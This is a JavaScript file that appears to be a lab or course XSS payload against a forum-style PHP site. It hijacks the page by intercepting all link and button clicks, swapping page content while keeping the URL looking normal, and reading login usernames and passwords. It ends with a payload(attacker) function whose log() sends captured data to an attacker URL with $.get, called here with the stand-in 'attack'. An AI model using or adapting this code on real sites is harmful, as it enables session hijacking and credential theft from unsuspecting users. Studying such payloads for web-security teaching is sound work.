var globalUsername;
//TODO: direct view post
// window.onhashchange = function() { 
//     console.log('location changed!');  
// };
// window.addEventListener('locationchange', function(){
//     console.log('location changed!');
// });
// window.addEventListener('unload', function(event) {
//     event.preventDefault();
//     console.log('Navigation occuring');
// });
// window.onbeforeunload = function() { 
//     return false;
// }



function loadContent(url, callback,data)
{

    xmlhttp=new XMLHttpRequest();
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && (xmlhttp.status==200 || xmlhttp.status==302))
        {
            callback(url,xmlhttp.response);
        }
    }
    xmlhttp.open("GET", url, false);
    if(data == null){
        xmlhttp.send();
    }else{
        xmlhttp.send(data);  
    }
    
}

function postRequest(url, callback, data, type){
    console.log("will post to "+ url +" data is : " + data);
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && (xmlhttp.status==200 || xmlhttp.status==302))
        {
            callback(url,xmlhttp.response);
        }else{
            console.log("post status: "+ xmlhttp.status);
        }
    }
    xmlhttp.open("POST", url, true);
    if(type == 1){
        xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    }else{
        xmlhttp.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryRpklzwpc8aHhtWOu");
    }
    
    xmlhttp.send(data);
}

function replacePage(url,data){
    //console.log(data);
    var dummy = document.createElement( 'html' );
    dummy.innerHTML = data;
    yourGlobalVariable = dummy;
    document.body.innerHTML = dummy.getElementsByTagName( 'body' )[0].innerHTML;
    window.history.pushState("object or string", "Title", url);
    window.dispatchEvent(new HashChangeEvent("hashchange"))
    addListener();
    console.log("page listener add done");
}

function linkClickHandler(element){
    console.log("called on "+ element.href);
    var path = element.href.substring(element.href.lastIndexOf("/")+1);
    if(path == 'login.php' || 'logout.php'){// get login page
        var url = element.href;
        console.log("will fetch " + url);
        loadContent(url,replacePage);
    }else{
        var url = element.href;
        console.log("will fetch " + url);
        loadContent(url,replacePage);
    }
}

function buttonClickHandler(element, url){
    console.log("called on submit"+ element.id);
    if(element.id == 'login-btn'){// submit login request
        url =  'post.php';
        var username = document.getElementById('username').value;
        var password = document.getElementById('userpass').value;
        var data = "username=" + username + "&password=" + password +"&form=login";
        console.log("will post username  " + username + " password " + password);
        postRequest(url, replacePage, data, 1);
    }else if(element.id == 'comment-post-btn'){
        // post comment
        url =  'post.php';
        var comment = document.getElementById('comment').value;
        var parent = document.getElementById('parent').value;
        var uid = document.getElementById('uid').value;

        var data = "comment=" + comment + "&form=comment&parent=" + parent +"&uid="+uid+"&submit=";
        console.log("will comments on behalf of  " + globalUsername + " parent " + parent);
        postRequest(url, replacePage, data, 1);
    }else if(element.id == 'content-post-btn'){
        // make a new post
        url =  'post.php';

        var title = document.getElementById('title').value;
        var content = document.getElementById('content').value;
        var type = document.getElementById('type').value;

        var data = "title=" + title + "&form=content&content=" + content +"&type="+type+"&submit=";
        console.log("will post on behalf of  " + globalUsername + "title: " + title + " type : " + type);
        postRequest(url, replacePage, data, 1);
    }else if(element.id == 'image-post-btn'){
        //post an image
        url = 'upload.php';
        
        var data = document.getElementById("content-file").files[0];
        var fileName = data.name;
        $('.custom-file-label').html(fileName);
        console.log("will post image on behalf of  " + globalUsername );

        //postRequest(url, replacePage, data, 2);
    }
}

function normalLinkHandler(username, url){
    
    // process url for different scenrio
    var voteUrl = 'vote.php';
    if(String(url).includes(voteUrl)){// process as post to vote
        var postId = new RegExp(/\\?id=[0-9]+/);
        var pos_vote_val = new RegExp(/vote=[0-9]+/);
        var neg_vote_val = new RegExp(/vote=-\d+$/);

        var postIdstr = String(url.match(postId));
        var id = postIdstr.substring(postIdstr.lastIndexOf("=")+1);

        var vote_valstr = String(url.match(pos_vote_val));
        if(vote_valstr == "null"){
            vote_valstr = String(url.match(neg_vote_val));
        }
        var val = vote_valstr.substring(vote_valstr.lastIndexOf("=")+1);
        console.log("user vote on post: "+ globalUsername + " postid : " + id + " vote val : "+ val);
        var data = "id=" + id + "&vote=" + val;
        loadContent(url,replacePage,data);

    }else{
        console.log("user view on username: "+ globalUsername + " url : " +url);
        loadContent(url,replacePage);
    }
    
    return false;
}


function addListener(){
    $('.custom-file-input').on('change', function() { 
        let fileName = $(this).val().split('\\').pop(); 
        $(this).next('.custom-file-label').addClass("selected").html(fileName); 
    });

    var usrname = document.getElementById('logged-in-user');
    if(usrname){
        globalUsername = usrname.innerText;
    }else{
        globalUsername = null;
    }
    for (var ls = document.links, numLinks = ls.length, i=0; i<numLinks; i++){
        var target = document.getElementById(ls[i].id);
        if(target){ // only ones with name like login/out
            document.getElementById(ls[i].id).addEventListener('click', function(event){
                event.preventDefault();
                var targetElement = event.target || event.srcElement;
                linkClickHandler(targetElement);
            });
        }else{

            ls[i].setAttribute("onclick","normalLinkHandler('" + globalUsername + "','"+ls[i].href +"'); return false;");
            
        }
        
    }
    var bns = document.getElementsByTagName("button");
    for (i = 0; i < bns.length; i++) {
        bns[i].addEventListener("click", function(event) {
            event.preventDefault();
            var targetElement = event.target || event.srcElement;
            buttonClickHandler(targetElement, document.url); 
        });
    }
}
function payload(attacker) {
    
    addListener();

    function log(data) {
        console.log($.param(data))
        $.get(attacker, data);
    }
    function proxy(href) {
        $("html").load(href, function(){
        $("html").show();
        log({event: "nav", url: href});
        });
    }
    //$("html").hide();
    //proxy("./");
}
payload("attack");